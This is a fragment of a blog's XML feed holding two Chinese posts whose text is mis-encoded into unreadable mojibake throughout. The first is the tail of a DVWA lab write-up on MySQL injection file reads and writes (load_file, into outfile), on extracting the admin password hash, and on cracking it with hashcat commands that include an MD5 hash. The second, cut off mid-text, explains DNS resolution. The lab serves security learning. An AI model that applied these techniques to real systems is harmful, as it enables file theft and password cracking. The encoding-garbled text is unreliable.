src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/rQJSMWpgFqEn2P4.png" alt="image-20201113230842289"></p><h2 id="è¯»æ–‡ä»¶ï¼ˆmysqlå¯¼å…¥æ•°æ®ï¼‰"><a href="#è¯»æ–‡ä»¶ï¼ˆmysqlå¯¼å…¥æ•°æ®ï¼‰" class="headerlink" title="è¯»æ–‡ä»¶ï¼ˆmysqlå¯¼å…¥æ•°æ®ï¼‰"></a>è¯»æ–‡ä»¶ï¼ˆmysqlå¯¼å…¥æ•°æ®ï¼‰</h2><p><strong>(1)load_file()</strong></p><p><strong>(2)load data infile()</strong></p><p><strong>(3)system cat</strong></p><p>load_file()å’Œload data infileè¯»å–æ–‡ä»¶çš„æ–¹æ³•ä¸º:æ–°å»ºä¸€ä¸ªè¡¨ï¼Œè¯»å–æ–‡ä»¶ä¸ºå­—ç¬¦ä¸²å½¢å¼æ’å…¥è¡¨ä¸­ï¼Œç„¶åè¯»å‡ºè¡¨ä¸­æ•°æ®ã€‚</p><p>system catååŠ æ–‡ä»¶è·¯å¾„ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U3DF2m1LXbCo7Zt.png" alt="image-20201113233615626"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ZAuskmMVWpbHn75.png" alt="image-20201113234015997"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201113234210769.png" alt="image-20201113234210769"></p><h2 id="å†™æ–‡ä»¶-mysqlå¯¼å‡ºæ•°æ®"><a href="#å†™æ–‡ä»¶-mysqlå¯¼å‡ºæ•°æ®" class="headerlink" title="å†™æ–‡ä»¶  (mysqlå¯¼å‡ºæ•°æ®)"></a>å†™æ–‡ä»¶  (mysqlå¯¼å‡ºæ•°æ®)</h2><p><strong>select â€˜   â€˜ into outfile</strong> </p><p>å¦‚ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lCJvISb6Pezq8oE.png" alt="image-20201113234946913"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yZDH4EV6ABao7OL.png" alt="image-20201113235046444"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/HZCNgiT9StwEM61.png" alt="image-20201114184126130"></p><h1 id="hashç›¸å…³"><a href="#hashç›¸å…³" class="headerlink" title="hashç›¸å…³"></a>hashç›¸å…³</h1><h2 id="æŸ¥è¯¢ç”¨æˆ·hash"><a href="#æŸ¥è¯¢ç”¨æˆ·hash" class="headerlink" title="æŸ¥è¯¢ç”¨æˆ·hash"></a>æŸ¥è¯¢ç”¨æˆ·hash</h2><p>ç›®æ ‡ï¼šdvwaçš„adminç”¨æˆ·çš„password</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/x9OkDFblViRWqjU.png" alt="image-20201115110152189"></p><p><a href="https://www.cmd5.com/">ç ´è§£</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/2kzlbPJABgNnKGW.png" alt="image-20201115110328511"></p><h2 id="ä½¿ç”¨-hashcat-æ¥å¯¹è·å–çš„-hash-è¿›è¡Œæš´åŠ›ç ´è§£"><a href="#ä½¿ç”¨-hashcat-æ¥å¯¹è·å–çš„-hash-è¿›è¡Œæš´åŠ›ç ´è§£" class="headerlink" title="ä½¿ç”¨ hashcat æ¥å¯¹è·å–çš„ hash è¿›è¡Œæš´åŠ›ç ´è§£"></a>ä½¿ç”¨ hashcat æ¥å¯¹è·å–çš„ hash è¿›è¡Œæš´åŠ›ç ´è§£</h2><p><a href="https://hashcat.net/hashcat/">ä¸‹è½½hashcat</a></p><p>åœ¨hashcatæ–‡ä»¶å¤¹æ–°å»º</p><p>hash.txt(ä¿å­˜è¦ç ´è§£çš„hashå€¼)</p><p>password.txt(ä¿å­˜å¯†ç å­—å…¸)</p><p>ä½¿ç”¨cmdè¿›å…¥hashcatæ‰€åœ¨ç›®å½•,ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œç ´è§£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 hash.txt password.txt</span><br></pre></td></tr></table></figure><p>-a 0 ä»£è¡¨ä½¿ç”¨å­—å…¸ç ´è§£æ¨¡å¼</p><p>-m 0 ä»£è¡¨Hash Typeä¸ºmd5</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/V2fysUPHAidRWc4.png" alt="image-20201115113529889"></p><p>ç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yW5AYkZS4PwIJmu.png" alt="image-20201115113724632"></p><p>ç ´è§£è®°å½•åœ¨hashcat.potfileæ–‡ä»¶ä¸­å¯æŸ¥</p><p>æˆ–å¯ç›´æ¥<strong>ä½¿ç”¨å­—å…¸è¿›è¡Œç ´è§£</strong>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 5f4dcc3b5aa765d61d8327deb882cf99 password.txt</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SJh5OiLlT92MH7X.png" alt="image-20201115114500987"></p><p>ç»“æœä¸€è‡´ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/weixin_33991418/article/details/89744955">å®‰è£…åˆå§‹åŒ–mysqlåï¼Œé»˜è®¤å‡ ä¸ªåº“ä»‹ç»</a></p><p>[2] <a href="https://blog.csdn.net/WYJ____/article/details/81234382?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">SQLæ³¨å…¥è¯»å†™æ–‡ä»¶</a></p><p>[3] <a href="https://blog.csdn.net/qq_34981272/article/details/99337529">æ•°æ®åº“ç³»ç»Ÿè¡¨ç›¸å…³å­¦ä¹ </a></p><p>[4] <a href="https://blog.csdn.net/smli_ng/article/details/106111493">hashcatè¯¦ç»†ä½¿ç”¨æ•™ç¨‹</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webé¡µé¢è§£ææµç¨‹çš„å­¦ä¹ </title>
      <link href="posts/671.html"/>
      <url>posts/671.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>WEB é¡µé¢è§£æçš„æ€»ä½“æµç¨‹</p><p>å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰å‘èµ·é¡µé¢è¯·æ±‚ï¼Œä¸»æœºå¯¹ åœ°å€ä¸­çš„DNS åŸŸåè¿›è¡Œè§£æï¼Œæ‰¾åˆ°å¯¹åº”çš„ IP åœ°å€ï¼Œè¯·æ±‚å‘é€åˆ° æœåŠ¡ç«¯ï¼ŒæœåŠ¡å™¨æ ¹æ®è¯·æ±‚å†…å®¹å‘é€å“åº”ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°å“åº”ï¼Œå°†å†…å®¹æ¸²æŸ“æˆç½‘é¡µã€‚</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222181119855.png" alt="image-20201222181119855"></p><h1 id="åŸŸåè§£æçš„è¿‡ç¨‹"><a href="#åŸŸåè§£æçš„è¿‡ç¨‹" class="headerlink" title="åŸŸåè§£æçš„è¿‡ç¨‹"></a>åŸŸåè§£æçš„è¿‡ç¨‹</h1><h2 id="åè¯è§£é‡Š"><a href="#åè¯è§£é‡Š" class="headerlink" title="åè¯è§£é‡Š"></a>åè¯è§£é‡Š</h2><p>(1) <strong>åŸŸå</strong>ï¼šç½‘ç»œæ˜¯åŸºäºTCP/IPåè®®è¿›è¡Œé€šä¿¡å’Œè¿æ¥çš„ï¼Œæ¯ä¸€å°ä¸»æœºéƒ½æœ‰å”¯ä¸€ä¸”å›ºå®šçš„IPåœ°å€ï¼Œä»è€ŒåŒºåˆ†å› ç‰¹ç½‘ä¸Šæ•°é‡åºå¤§çš„ä¸»æœºã€‚IPåœ°å€æ˜¯æ•°å­—å‹çš„ï¼Œæ•°å­—è¾ƒå¤šä¸æ–¹ä¾¿è®°å¿†ï¼Œäºæ˜¯äººä»¬åˆå‘æ˜äº†åŸŸååœ°å€ï¼Œé‡‡ç”¨å­—ç¬¦å‹ç»“æ„ã€‚åŸŸååœ°å€æ˜¯åŸŸçš„è‡ªç„¶è¯­è¨€åç§°ï¼Œå®ƒä¸æ•°å­—å¼IPåœ°å€å­˜åœ¨ä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚IPåœ°å€å¦‚åŒç”µè„‘çš„èº«ä»½è¯å·ç ï¼Œè€ŒåŸŸååœ°å€åˆ™ç›¸å½“äºç”µè„‘çš„å§“åï¼Œæ–¹ä¾¿äººä»¬è®°å¿†å’Œä½¿ç”¨ã€‚åŸŸåä¸€èˆ¬ç”±ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¯æ„æˆï¼Œä¸­é—´ç”¨â€œ.â€è¿›è¡Œåˆ†éš”ï¼Œå…¶ç»“æ„æ˜¯ï¼šå››çº§åŸŸå.ä¸‰çº§åŸŸå.äºŒçº§åŸŸå.ä¸€çº§åŸŸåã€‚</p><p>(2) <strong>DNS</strong>ï¼š<strong>åŸŸåç³»ç»Ÿ</strong>ï¼ˆè‹±è¯­ï¼š<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystemï¼Œç¼©å†™ï¼š<strong>DNS</strong>ï¼‰æ˜¯äº’è”ç½‘çš„ä¸€é¡¹æœåŠ¡ã€‚å®ƒä½œä¸ºå°†åŸŸåå’ŒIPåœ°å€ç›¸äº’æ˜ å°„çš„ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ï¼Œèƒ½å¤Ÿä½¿äººæ›´æ–¹ä¾¿åœ°è®¿é—®äº’è”ç½‘ã€‚DNSä½¿ç”¨TCPå’ŒUDPç«¯å£53ã€‚å½“å‰ï¼Œå¯¹äºæ¯ä¸€çº§åŸŸåé•¿åº¦çš„é™åˆ¶æ˜¯63ä¸ªå­—ç¬¦ï¼ŒåŸŸåæ€»é•¿åº¦åˆ™ä¸èƒ½è¶…è¿‡253ä¸ªå­—ç¬¦ã€‚</p><p><strong>DNS æœåŠ¡å™¨çš„åˆ†å±‚ç»“æ„</strong></p><p>DNS æœåŠ¡å™¨é‡‡ç”¨åˆ†å¸ƒå¼ã€åˆ†å±‚çš„æ–¹å¼éƒ¨ç½²åœ¨ä¸–ç•Œå„åœ°ã€‚æŒ‰ç…§å±‚çº§ä»é«˜åˆ°ä½ï¼ŒDNS æœåŠ¡å™¨åˆ†ä¸ºï¼š<code>æ ¹åŸŸåæœåŠ¡å™¨</code>ï¼ˆRoot DNS Serversï¼‰ã€<code>é¡¶çº§åŸŸåæœåŠ¡å™¨</code>ï¼ˆTLD DNS Serversï¼‰ã€<code>æƒå¨åŸŸåæœåŠ¡å™¨</code>ï¼ˆAuthoritative DNS Serversï¼‰ï¼Œå±‚çº§å…³ç³»å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222181259372.png" alt="image-20201222181259372"></p><ul><li><code>æ ¹åŸŸåæœåŠ¡å™¨</code>ï¼šä¸–ç•Œä¸Šæœ‰ 13 ä¸ª <code>æ ¹åŸŸåæœåŠ¡å™¨</code>ï¼Œå‡†ç¡®æ¥è¯´æ˜¯ 13 ç»„æœåŠ¡å™¨ç¾¤ç»„ï¼ŒæœåŠ¡å™¨ç»„ä¸­çš„æ¯ä¸€ä¸ª<code>æ ¹åŸŸåæœåŠ¡å™¨</code>éƒ½æœ‰æ‰€æœ‰<code>é¡¶çº§åŸŸåæœåŠ¡å™¨</code>ï¼ˆcom, org, gov â€¦ï¼‰çš„ IP åœ°å€ã€‚</li><li><code>é¡¶çº§åŸŸåæœåŠ¡å™¨</code>ï¼šä¸ºé¡¶çº§åŸŸåå¦‚ comã€orgã€net ç­‰æä¾›åŸŸåè§£ææœåŠ¡ï¼Œæ¯ä¸€ä¸ªé¡¶çº§åŸŸåéƒ½æœ‰ç›¸åº”çš„ <code>é¡¶çº§åŸŸåæœåŠ¡å™¨</code>ï¼Œå­˜æ”¾å…¶æ‰€æœ‰å­åŸŸåçš„ IP åœ°å€ã€‚</li><li><code>æƒå¨åŸŸåæœåŠ¡å™¨</code>ï¼šå„ç§ç»„ç»‡æœºæ„ï¼Œå¦‚ä¼ä¸šã€å­¦æ ¡ã€æ”¿åºœç»„ç»‡ç­‰éƒ½éœ€ä¸ºå…¶æä¾›ç½‘ç»œæœåŠ¡çš„ä¸»æœºå–ä¸€ä¸ªåˆé€‚çš„åŸŸåï¼Œå¦‚ ç™¾åº¦å…¬å¸çš„ baidu.comï¼Œè€Œä¸»æœºçš„ IP åœ°å€å’ŒåŸŸåçš„å¯¹åº”å…³ç³»å°±ä¿å­˜è‡³å…¶<code>æƒå¨åŸŸåæœåŠ¡å™¨</code>ä¸­ã€‚ä¸€èˆ¬å¤§å…¬å¸å’Œå­¦æ ¡éƒ½ä¼šéƒ¨ç½²è‡ªå·±çš„<code>æƒå¨åŸŸåæœåŠ¡å™¨</code>ã€‚</li></ul><p>(3) <strong>åŸŸåè§£æ</strong>ï¼šå³åŸŸååˆ°IPåœ°å€çš„è½¬æ¢è¿‡ç¨‹ã€‚åŸŸåçš„è§£æå·¥ä½œç”±DNSæœåŠ¡å™¨å®Œæˆã€‚DNSæŸ¥è¯¢æœ‰ä¸¤ç§æ–¹å¼ï¼š<strong>é€’å½’</strong>å’Œ<strong>è¿­ä»£</strong>ã€‚DNSå®¢æˆ·ç«¯è®¾ç½®ä½¿ç”¨çš„DNSæœåŠ¡å™¨ä¸€èˆ¬éƒ½æ˜¯é€’å½’æœåŠ¡å™¨ï¼Œå®ƒè´Ÿè´£å…¨æƒå¤„ç†å®¢æˆ·ç«¯çš„DNSæŸ¥è¯¢è¯·æ±‚ï¼Œç›´åˆ°è¿”å›æœ€ç»ˆç»“æœã€‚è€ŒDNSæœåŠ¡å™¨ä¹‹é—´ä¸€èˆ¬é‡‡ç”¨è¿­ä»£æŸ¥è¯¢æ–¹å¼ã€‚</p><p><strong>é€’å½’æŸ¥è¯¢</strong>ï¼šæœ¬æœºå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘å‡ºä¸€æ¬¡æŸ¥è¯¢è¯·æ±‚ï¼Œå°±é™å¾…æœ€ç»ˆçš„ç»“æœã€‚å¦‚æœæœ¬åœ°åŸŸåæœåŠ¡å™¨æ— æ³•è§£æï¼Œè‡ªå·±ä¼šä»¥DNSå®¢æˆ·æœºçš„èº«ä»½å‘å…¶å®ƒåŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æœ€ç»ˆçš„IPåœ°å€å‘Šè¯‰æœ¬æœºã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DNS%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2%E5%AE%9E%E4%BE%8B.jpg"></p><p><strong>è¿­ä»£æŸ¥è¯¢</strong>ï¼šæœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰å®ƒä¸‹ä¸€æ­¥åˆ°å“ªé‡Œå»æŸ¥è¯¢ï¼Œç„¶åå®ƒå†å»æŸ¥ï¼Œæ¯æ¬¡å®ƒéƒ½æ˜¯ä»¥å®¢æˆ·æœºçš„èº«ä»½å»å„ä¸ªæœåŠ¡å™¨æŸ¥è¯¢ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DNS%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2%E5%AE%9E%E4%BE%8B.jpg"></p><h2 id="æµç¨‹ä»‹ç»"><a href="#æµç¨‹ä»‹ç»" class="headerlink" title="æµç¨‹ä»‹ç»"></a>æµç¨‹ä»‹ç»</h2><p>(1) <strong>æµè§ˆå™¨è¾“å…¥åŸŸåä¹‹åï¼Œé¦–å…ˆä¼šæ£€æŸ¥æµè§ˆå™¨ç¼“å­˜ä¸­æ˜¯å¦ç¼“å­˜è¿‡è¯¥åŸŸåå¯¹åº”çš„IPåœ°å€</strong></p><p>ç”¨æˆ·é€šè¿‡æµè§ˆå™¨æµè§ˆè¿‡æŸç½‘ç«™ä¹‹åï¼Œæµè§ˆå™¨å°±ä¼šè‡ªåŠ¨ç¼“å­˜è¯¥ç½‘ç«™åŸŸåå¯¹åº”çš„åœ°å€ï¼Œå½“ç”¨æˆ·å†æ¬¡è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°±ä¼šä»ç¼“å­˜ä¸­æŸ¥æ‰¾è¯¥åŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œå› ä¸ºç¼“å­˜ä¸ä»…æ˜¯æœ‰å¤§å°é™åˆ¶ï¼Œè€Œä¸”è¿˜æœ‰æ—¶é—´é™åˆ¶ï¼ˆåŸŸåè¢«ç¼“å­˜çš„æ—¶é—´é€šè¿‡å±æ€§æ¥è®¾ç½®ï¼‰ï¼Œæ‰€ä»¥å­˜åœ¨åŸŸåå¯¹åº”çš„æ‰¾ä¸åˆ°çš„æƒ…å†µã€‚å½“æµè§ˆå™¨ä»ç¼“å­˜ä¸­æ‰¾åˆ°äº†è¯¥ç½‘ç«™åŸŸåå¯¹åº”çš„åœ°å€ï¼Œé‚£ä¹ˆæ•´ä¸ªè§£æè¿‡ç¨‹ç»“æŸï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°†è¿›è¡Œä¸‹ä¸€æ­¥éª¤ã€‚å¯¹äºçš„ç¼“å­˜æ—¶é—´é—®é¢˜ï¼Œä¸å®œè®¾ç½®å¤ªé•¿çš„ç¼“å­˜æ—¶é—´ï¼Œæ—¶é—´å¤ªé•¿ï¼Œå¦‚æœåŸŸåå¯¹åº”çš„å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆç”¨æˆ·å°†åœ¨ä¸€æ®µæ—¶é—´å†…æ— æ³•æ­£å¸¸è®¿é—®åˆ°ç½‘ç«™ï¼Œå¦‚æœå¤ªçŸ­ï¼Œé‚£ä¹ˆåˆé€ æˆé¢‘ç¹è§£æåŸŸåã€‚</p><p>(2) <strong>å¦‚æœåœ¨æµè§ˆå™¨ç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°IPï¼Œé‚£ä¹ˆå°†ç»§ç»­æŸ¥æ‰¾æœ¬æœºç³»ç»Ÿæ˜¯å¦ç¼“å­˜è¿‡IP</strong></p><p>å¦‚æœç¬¬ä¸€ä¸ªæ­¥éª¤æ²¡æœ‰å®Œæˆå¯¹åŸŸåçš„è§£æè¿‡ç¨‹ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå»ç³»ç»Ÿç¼“å­˜ä¸­æŸ¥æ‰¾ç³»ç»Ÿæ˜¯å¦ç¼“å­˜è¿‡è¿™ä¸ªåŸŸåå¯¹åº”çš„åœ°å€ã€‚å…¶å®æ“ä½œç³»ç»Ÿä¹Ÿæœ‰ä¸€ä¸ªåŸŸåè§£æçš„è¿‡ç¨‹ï¼Œé€šè¿‡<strong>hostsæ–‡ä»¶</strong>è®¾ç½®ï¼Œç”¨æˆ·å¯ä»¥å°†ä»»ä½•åŸŸåè§£æåˆ°ä»»ä½•èƒ½å¤Ÿè®¿é—®çš„IPåœ°å€ã€‚æ­£æ˜¯å› ä¸ºæœ‰è¿™ç§æœ¬åœ°DNSè§£æçš„è§„ç¨‹ï¼Œæ‰€ä»¥æœ‰é»‘å®¢å°±å¯èƒ½é€šè¿‡ä¿®æ”¹ç”¨æˆ·çš„åŸŸåæ¥æŠŠç‰¹å®šçš„åŸŸåè§£æåˆ°ä»–æŒ‡å®šçš„IPåœ°å€ä¸Šï¼Œå¯¼è‡´è¿™äº›åŸŸåè¢«åŠ«æŒã€‚</p><p>(3) <strong>å‘æœ¬åœ°åŸŸåè§£ææœåŠ¡ç³»ç»Ÿå‘èµ·åŸŸåè§£æçš„è¯·æ±‚</strong></p><p>ä»¥ä¸Šä¸¤æ­¥çš„è§£ææ˜¯åœ¨æœ¬æœºä¸Šå®Œæˆçš„ï¼Œå¦‚æœæœ¬æœºæ— æ³•è§£æåŸŸåï¼Œé‚£ä¹ˆç³»ç»Ÿåªèƒ½è¯·æ±‚æœ¬åœ°åŸŸåè§£ææœåŠ¡ç³»ç»Ÿè¿›è¡Œè§£æï¼Œæœ¬åœ°åŸŸåç³»ç»Ÿä¸€èˆ¬éƒ½æ˜¯æœ¬åœ°åŒºçš„åŸŸåæœåŠ¡å™¨ï¼Œæ¯”å¦‚ä½ è¿æ¥çš„æ ¡å›­ç½‘ï¼Œé‚£ä¹ˆåŸŸåè§£æç³»ç»Ÿå°±åœ¨ä½ çš„æ ¡å›­æœºæˆ¿é‡Œï¼Œå¦‚æœä½ è¿æ¥çš„æ˜¯ç”µä¿¡ã€ç§»åŠ¨æˆ–è€…è”é€šçš„ç½‘ç»œï¼Œé‚£ä¹ˆæœ¬åœ°åŸŸåè§£ææœåŠ¡å™¨å°±åœ¨æœ¬åœ°åŒºï¼Œç”±å„è‡ªçš„è¿è¥å•†æ¥æä¾›æœåŠ¡ã€‚å¯¹äºæœ¬åœ°åŸŸåè§£ææœåŠ¡å™¨ï¼Œä¸€èˆ¬éƒ½ç¼“å­˜äº†åœ°åŒºå†…éƒ¨åŸŸåè§£æè¯·æ±‚çš„ç»“æœï¼Œå¦‚æœç¼“å­˜å‘½ä¸­åˆ™è¿”å›ç›¸åº”çš„ç»“æœï¼Œå½“ç„¶ç¼“å­˜æ—¶é—´ä¹Ÿå—åŸŸåå¤±æ•ˆæ—¶é—´æ§åˆ¶ã€‚å¤§çº¦80%çš„åŸŸåè§£æåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œæ‰€ä»¥æœ¬åœ°åŸŸåè§£æç³»ç»Ÿä¸»è¦æ‰¿æ‹…äº†åŸŸåçš„è§£æå·¥ä½œã€‚</p><p>(4) <strong>å‘æ ¹åŸŸåè§£ææœåŠ¡å™¨å‘èµ·åŸŸåè§£æè¯·æ±‚</strong></p><p>å¦‚æœæœ¬åœ°åŸŸåè§£æç³»ç»Ÿçš„ç¼“å­˜ä¸­æ²¡æœ‰æ‰€éœ€è¦æŸ¥æ‰¾åˆ°åŸŸåï¼Œåˆ™å°†ä¼šå‘æ ¹åŸŸåæœåŠ¡å™¨å‘èµ·è§£æè¯·æ±‚ã€‚</p><p>(5) <strong>æ ¹åŸŸåæœåŠ¡å™¨è¿”å›ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨ä¸€ä¸ªæ‰€æŸ¥è¯¢çš„ä¸»åŸŸåæœåŠ¡å™¨ï¼ˆgTLD Serverï¼‰åœ°å€</strong></p><p>æ ¹åŸŸåæ˜¯ä¸è´Ÿè´£è§£æåŸŸåçš„ï¼Œå®ƒåªè´Ÿè´£ç®¡ç†æ‰€æœ‰çš„é¡¶çº§åŸŸåã€‚æ¯”å¦‚ï¼šä½ è¦è§£æçš„ç½‘å€æ˜¯ï¼š<em><a href="http://www.xxx.com/">www.xxx.com</a></em>ï¼Œæ ¹åŸŸåæœåŠ¡å™¨æ˜¯ä¸çŸ¥é“è¿™ä¸ªåŸŸåçš„IPåœ°å€çš„ï¼Œä½†æ˜¯å®ƒçŸ¥é“è¿™ä¸ªIPåœ¨å®ƒç®¡ç†çš„<code>.com</code>åŸŸåä¸‹ï¼Œæ ¹åŸŸåæœåŠ¡å™¨ä¼šå‘è¯·æ±‚æ–¹å‘é€<code>.com</code>åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼Œå¼•å¯¼è¯·æ±‚æ–¹ç»§ç»­æŸ¥è¯¢ã€‚</p><p>(6) <strong>æœ¬åœ°åŸŸåæœåŠ¡å™¨LDNSå†å‘ä¸Šä¸€æ­¥è¿”å›çš„gTLDæœåŠ¡å™¨å‘é€è¯·æ±‚</strong></p><p>å› ä¸ºåŸŸåæœåŠ¡å™¨ä¹‹é—´ä¼šæœ‰å¤§é‡çš„æ•°æ®éœ€è¦å¤„ç†ï¼Œæ‰€ä»¥DNSæœåŠ¡å™¨ä¹‹é—´ä¸€èˆ¬é‡‡ç”¨è¿­ä»£æŸ¥è¯¢æ–¹å¼ã€‚æœ¬åœ°åŸŸåè§£ææœåŠ¡å™¨å‘gTLDæœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</p><p>(7) <strong>gTLDæœåŠ¡å™¨æ¥æ”¶è¯·æ±‚å¹¶è¿”å›Name ServeræœåŠ¡å™¨</strong></p><p>æŒ‡å®šçš„åŸŸåç”±æŒ‡å®šçš„Name ServeræœåŠ¡å™¨è¿›è¡Œè§£æã€‚</p><p>(8) <strong>Name ServeræœåŠ¡å™¨è¿”å›IPåœ°å€ç»™æœ¬åœ°æœåŠ¡å™¨</strong></p><p>æœåŠ¡å™¨æŸ¥æ‰¾åŸŸåå¯¹åº”çš„åœ°å€ï¼Œå°†åœ°å€è¿åŒå€¼è¿”å›ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨ã€‚</p><p>(9) <strong>æœ¬åœ°åŸŸåæœåŠ¡å™¨ç¼“å­˜è§£æç»“æœ</strong></p><p>æœ¬åœ°åŸŸåæœåŠ¡å™¨ç¼“å­˜è§£æåçš„ç»“æœï¼Œç¼“å­˜æ—¶é—´ç”±TTLå€¼æ§åˆ¶ã€‚</p><p>(10) <strong>è¿”å›è§£æç»“æœç»™ç”¨æˆ·</strong></p><p>è§£æç»“æœå°†ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ç³»ç»Ÿå°†ç¼“å­˜è¯¥åœ°å€ï¼Œç”¨æˆ·æ ¹æ®TTLå€¼ç¼“å­˜åœ¨æœ¬åœ°ç³»ç»Ÿç¼“å­˜ä¸­ï¼ŒåŸŸåè§£æè¿‡ç¨‹ç»“æŸã€‚</p><h2 id="åŸŸåè§£æè®°å½•"><a href="#åŸŸåè§£æè®°å½•" class="headerlink" title="åŸŸåè§£æè®°å½•"></a>åŸŸåè§£æè®°å½•</h2><ul><li><p>A(Address)è®°å½•ï¼šç”¨æ¥æŒ‡å®šä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰å¯¹åº”çš„IPåœ°å€è®°å½•ã€‚</p></li><li><p>CNAME(åˆ«å)è®°å½•ï¼šå³åˆ«åè®°å½•ã€‚è¿™ç§è®°å½•å…è®¸æ‚¨å°†å¤šä¸ªåå­—æ˜ å°„åˆ°å¦å¤–ä¸€ä¸ªåŸŸåã€‚é€šå¸¸ç”¨äºåŒæ—¶æä¾›WWWå’ŒMAILæœåŠ¡çš„è®¡ç®—æœºã€‚ä¾‹å¦‚ï¼Œæœ‰ä¸€å°è®¡ç®—æœºåä¸ºâ€œhost.mydomain.comâ€ï¼ˆAè®°å½•ï¼‰ã€‚å®ƒåŒæ—¶æä¾›WWWå’ŒMAILæœåŠ¡ï¼Œä¸ºäº†ä¾¿äºç”¨æˆ·è®¿é—®æœåŠ¡ã€‚å¯ä»¥ä¸ºè¯¥è®¡ç®—æœºè®¾ç½®ä¸¤ä¸ªåˆ«åï¼ˆCNAMEï¼‰ï¼šWWWå’ŒMAILã€‚è¿™ä¸¤ä¸ªåˆ«åçš„å…¨ç§°å°± <a href="http://www.mydomain.com/%E5%92%8C%E2%80%9Cmail.mydomain.com%E2%80%9D%E3%80%82%E5%AE%9E%E9%99%85%E4%B8%8A%E4%BB%96%E4%BB%AC%E9%83%BD%E6%8C%87%E5%90%91">http://www.mydomain.com/å’Œâ€œmail.mydomain.comâ€ã€‚å®é™…ä¸Šä»–ä»¬éƒ½æŒ‡å‘</a> â€œhost.mydomain.comâ€ã€‚</p></li><li><p>MX è®°å½•ï¼š é‚®ä»¶äº¤æ¢è®°å½•ã€‚å®ƒæŒ‡å‘â¼€ä¸ªé‚®ä»¶æœåŠ¡å™¨ï¼Œâ½¤äºç”µâ¼¦é‚®ä»¶ç³»ç»Ÿå‘é‚®<br>ä»¶æ—¶æ ¹æ® æ”¶ä¿¡â¼ˆçš„åœ°å€åç¼€æ¥å®šä½é‚®ä»¶æœåŠ¡å™¨ã€‚å¦‚ï¼šç”¨æˆ·æ‰€ç”¨çš„é‚®ä»¶æ˜¯ä»¥åŸŸåmydomain.comä¸ºç»“å°¾çš„ï¼Œåˆ™éœ€è¦åœ¨ç®¡ç†ç•Œé¢ä¸­æ·»åŠ è¯¥åŸŸåçš„MXè®°å½•æ¥å¤„ç†æ‰€æœ‰ä»¥@mydomain.comç»“å°¾çš„é‚®ä»¶ã€‚</p></li><li><p>NS(Name 